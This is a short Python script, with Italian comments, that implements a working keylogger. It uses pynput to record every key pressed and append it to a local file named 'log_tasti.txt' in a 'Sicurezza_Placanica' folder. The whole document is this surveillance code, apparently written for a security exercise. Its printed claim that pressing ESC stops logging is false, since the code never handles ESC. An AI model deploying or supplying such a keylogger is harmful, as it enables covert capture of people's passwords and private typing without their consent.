import os
import time
from pynput import keyboard

def keylogger_reale():
    """Registra i tasti premuti dall'utente e li salva in un file."""
    cartella = os.path.join(os.path.dirname(__file__), "Sicurezza_Placanica")
    os.makedirs(cartella, exist_ok=True)  # Crea la cartella se non esiste
    nome_file = os.path.join(cartella, "log_tasti.txt")
    
    print("Keylogger avviato... (Premi ESC per terminare)")
    
    def on_press(key):
        try:
            with open(nome_file, "a") as file:
                if hasattr(key, 'char') and key.char is not None:
                    file.write(key.char)
                else:
                    file.write(f'[{key}]')  # Per tasti speciali
                file.flush()
        except Exception as e:
            print(f"Errore: {e}")
    
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    keylogger_reale()